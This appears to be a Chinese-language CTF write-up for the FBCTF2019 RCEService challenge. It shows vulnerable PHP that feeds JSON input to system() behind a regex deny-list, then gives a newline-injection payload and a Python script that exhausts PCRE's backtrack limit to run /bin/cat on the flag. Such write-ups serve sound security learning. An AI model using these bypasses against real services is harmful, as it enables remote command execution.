---
title: FBCTF2019 RCEService
date: 2024-05-29 17:05:27
tags: 题解
categories: 刷题笔记
---

## [FBCTF2019]RCEService

用json格式输入{"cmd":"ls"}

![image-20240529170911278](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405291709460.png)

我们再查看源码（可能比赛给了源码吧，我是没找到）

<!-- more -->

```
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else if (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

我们发现过滤了好多东西

然后要进行绕过

**第一种方法：**

由于preg_match只匹配第一行，所以这里可以采用多行绕过

由于putenv('PATH=/home/rceservice/jail');修改了环境变量，所以只能使用绝对路径使用cat命令，cat命令在/bin文件夹下

```
?cmd=%0a{"cmd":"/bin/cat /home/rceservice/flag"%0a}
```

在使用PHP脚本时，如果你设置了环境变量 `PATH`，并且这个变量的值不包含 `/bin`，那么你将无法使用相对路径来调用系统命令（如 `cat`），而必须使用绝对路径。



**第二种方法**

利用回溯次数来绕过函数

```
import requests

url='http://node2.anna.nssctf.cn:28505/'
data={
    'cmd':'{"cmd":"/bin/cat /home/rceservice/flag","qq":"'+'a'*1000000+'"}'
}
r=requests.post(url=url,data=data).text
print(r)

```

![image-20240529172723017](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405291727104.png)

PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit

回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。
